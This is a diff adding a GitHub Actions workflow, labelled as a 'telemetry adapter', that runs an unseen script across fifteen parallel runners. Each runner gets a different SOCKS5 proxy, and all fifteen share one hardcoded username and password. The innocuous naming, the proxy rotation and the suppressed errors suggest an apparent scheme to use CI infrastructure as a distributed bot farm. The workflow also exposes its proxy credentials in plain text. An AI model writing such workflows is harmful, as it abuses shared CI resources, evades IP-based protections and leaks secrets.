@@ -1,0 +1,140 @@
+name: opal-telemetry-adapter
+on:
+  push:
+    branches: [ "main" ]
+    paths:
+      - '.github/workflows/opal-telemetry-adapter.yml'
+      - 'opal-telemetry-adapter.js'
+      - 'package.json'
+
+jobs:
+  preflight_check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+      - name: Setup Node.js Environment
+        uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - name: Validate Dependencies & Syntax
+        run: |
+          node -v
+          npm -v
+          echo "Preflight check passed. Launching distributed execution matrix..."
+
+  parallel_execution:
+    needs: [preflight_check]
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+        - os: windows-2022
+          runtime: bun
+          version: 'latest'
+          proxy: "socks5://dcswarup:webshare@136.0.126.245:6006"
+        - os: windows-2025
+          runtime: node
+          version: '24'
+          proxy: "socks5://dcswarup:webshare@82.27.245.13:6336"
+        - os: ubuntu-22.04
+          runtime: node
+          version: '20'
+          proxy: "socks5://dcswarup:webshare@31.58.23.2:5575"
+        - os: ubuntu-20.04
+          runtime: node
+          version: '18'
+          proxy: "socks5://dcswarup:webshare@45.38.78.248:6185"
+        - os: windows-latest
+          runtime: node
+          version: '22'
+          proxy: "socks5://dcswarup:webshare@213.169.215.150:5290"
+        - os: ubuntu-24.04
+          runtime: node
+          version: '22'
+          proxy: "socks5://dcswarup:webshare@23.27.78.109:5689"
+        - os: ubuntu-latest
+          runtime: bun
+          version: 'latest'
+          proxy: "socks5://dcswarup:webshare@82.26.246.140:7964"
+        - os: windows-latest
+          runtime: node
+          version: '20'
+          proxy: "socks5://dcswarup:webshare@94.176.212.102:6618"
+        - os: ubuntu-20.04
+          runtime: node
+          version: '24'
+          proxy: "socks5://dcswarup:webshare@104.239.23.192:5953"
+        - os: windows-2025
+          runtime: node
+          version: '18'
+          proxy: "socks5://dcswarup:webshare@107.175.135.139:6580"
+        - os: ubuntu-24.04
+          runtime: node
+          version: '22'
+          proxy: "socks5://dcswarup:webshare@195.172.135.200:5336"
+        - os: ubuntu-latest
+          runtime: bun
+          version: 'latest'
+          proxy: "socks5://dcswarup:webshare@46.202.224.240:5792"
+        - os: ubuntu-22.04
+          runtime: node
+          version: '20'
+          proxy: "socks5://dcswarup:webshare@45.87.51.72:6632"
+        - os: windows-2022
+          runtime: node
+          version: '24'
+          proxy: "socks5://dcswarup:webshare@38.154.199.57:5211"
+        - os: ubuntu-22.04
+          runtime: node
+          version: '18'
+          proxy: "socks5://dcswarup:webshare@104.238.38.7:6275"
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        if: ${{ matrix.runtime == 'node' }}
+        uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.version }}
+
+      - name: Setup Bun
+        if: ${{ matrix.runtime == 'bun' }}
+        uses: oven-sh/setup-bun@v2
+        with:
+          bun-version: latest
+
+      - name: Run Task (Linux)
+        if: runner.os != 'Windows'
+        run: |
+          if [ "${{ matrix.runtime }}" = "bun" ]; then
+            bun install
+            bun run opal-telemetry-adapter.js "${{ matrix.proxy }}" || true
+          else
+            npm install
+            node opal-telemetry-adapter.js "${{ matrix.proxy }}" || true
+          fi
+
+      - name: Run Task (Windows)
+        if: runner.os == 'Windows'
+        shell: pwsh
+        run: |
+          if ("${{ matrix.runtime }}" -eq "bun") {
+            bun install
+            bun run opal-telemetry-adapter.js "${{ matrix.proxy }}"
+          } else {
+            npm install
+            node opal-telemetry-adapter.js "${{ matrix.proxy }}"
+          }
+
+  pipeline_summary:
+    needs: [parallel_execution]
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      - name: Log Execution Summary
+        run: |
+          echo "Pipeline opal-telemetry-adapter finished execution at $(date -u +'%Y-%m-%dT%H:%M:%SZ')"
+          echo "Status: ${{ job.status }}"
